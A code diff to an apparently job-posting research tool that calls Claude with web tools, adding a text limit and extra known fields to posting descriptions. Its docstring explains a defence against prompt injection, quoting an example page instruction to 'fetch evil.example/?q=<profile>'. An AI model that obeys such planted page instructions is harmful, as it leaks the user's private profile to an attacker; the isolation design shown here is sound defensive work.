@@ -29,6 +29,7 @@ LOCK_WAIT_S = 1800
 # file tool that slipped through would see nothing there (not the repo, not the configs).
 WORK_DIR: Path | None = None
 TRIAGE_TEXT_LIMIT = 1500
+REPORT_TEXT_LIMIT = 6000  # the research opens the posting itself when its text was cut
 
 
 class ClaudeError(RuntimeError):
@@ -153,8 +154,12 @@ def _split(template: str, **values: str) -> tuple[str, str]:
     return system.strip(), message
 
 
-def describe(p: Posting, text_limit: int | None = None) -> str:
+def describe(p: Posting, text_limit: int | None = None, known: bool = False) -> str:
+    """`known` adds what the radar already knows about the posting (its date, the employer line and
+    website triage found) and marks a cut text, so the report's research need not look them up."""
     text = p.text if text_limit is None else p.text[:text_limit]
+    if known and len(p.text) > len(text):
+        text += "\n[text cut here]"
     # Feeds often carry only a title ("Role (City) - Employer"); without this hint the model asks for more.
     text = text or "(none in this source: rate on title, company and location)"
     lines = [f"id: {p.id}", f"title: {p.title}", f"company: {p.company}", f"location: {p.location}",
@@ -163,6 +168,9 @@ def describe(p: Posting, text_limit: int | None = None) -> str:
         lines.append(f"salary: {p.salary}")
     if p.tags:
         lines.append(f"tags: {', '.join(p.tags)}")
+    if known:
+        lines += [f"{key}: {value}" for key, value in (("published", p.posted_at), ("employer", p.employer),
+                                                      ("website", p.website)) if value]
     return "\n".join(lines) + f"\ntext:\n{text}"
 
 
@@ -213,9 +221,10 @@ def deep_report(p: Posting, *, profile: str, model: str, timeout: int = 900, run
                 on_usage=None) -> str:
     """Two calls: the web research never sees the profile, so a page that injects "fetch
     evil.example/?q=<profile>" has nothing to leak; the report is then written without tools."""
-    notes = run(_fill("deep-research.md", posting=describe(p)), model=model, tools=["WebSearch", "WebFetch"],
+    posting = describe(p, REPORT_TEXT_LIMIT, known=True)
+    notes = run(_fill("deep-research.md", posting=posting), model=model, tools=["WebSearch", "WebFetch"],
                 timeout=timeout, runner=runner, on_usage=on_usage)
-    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), notes=notes,
+    prompt = _fill("deep-report.md", profile=profile, posting=posting, notes=notes,
                    today=date.today().isoformat())
     return run(prompt, model=model, tools=[], timeout=timeout, runner=runner, on_usage=on_usage).strip()
 
